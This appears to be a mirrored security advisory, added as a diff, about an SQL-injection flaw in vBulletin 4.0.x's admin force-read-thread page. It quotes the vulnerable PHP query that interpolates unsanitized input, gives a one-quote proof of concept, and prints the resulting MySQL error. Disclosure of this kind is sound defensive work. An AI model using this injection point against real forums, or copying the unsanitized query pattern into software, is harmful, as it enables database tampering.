@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/61449/info
+
+VBulletin is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+VBulletin 4.0.x are vulnerable. 
+
+The exploit is caused due to a variable named 'update_order' not being
+sanitized before being used within an insert into statement.
+
+if ($_REQUEST['do'] == 'update_order')
+{
+$vbulletin->input->clean_array_gpc('r', array(
+'force_read_order'   => TYPE_ARRAY
+));
+
+if ($vbulletin->GPC['force_read_order'])
+{
+foreach ($vbulletin->GPC['force_read_order'] AS $threadid => $order)
+{
+$db->query_write("
+UPDATE " . TABLE_PREFIX . "thread AS thread
+SET force_read_order = '$order'
+WHERE threadid = '$threadid'
+");
+}
+}
+  POC
+ You will need Admincp Access then go to
+site.com/admincp/force_read_thread.php then in the force read order colum
+put a ' into one of them to show this
+ Database error in vBulletin 4.2.1:
+
+Invalid SQL:
+
+UPDATE thread AS thread
+SET force_read_order = '1''
+WHERE threadid = '5161';
+
+MySQL Error   : You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the right syntax to use near
+'5161'' at line 2
+Error Number  : 1064
+Request Date  : Thursday, July 25th 2013 @ 01:20:52 AM
+Error Date    : Thursday, July 25th 2013 @ 01:20:52 AM
+Script        :
+http://www.example.com/admincp/force_read_thread.php?do=update_order
+Referrer      : http://www.example.com/admincp/force_read_thread.php
+IP Address    :
+Username      : n3tw0rk
+Classname     :
+MySQL Version :
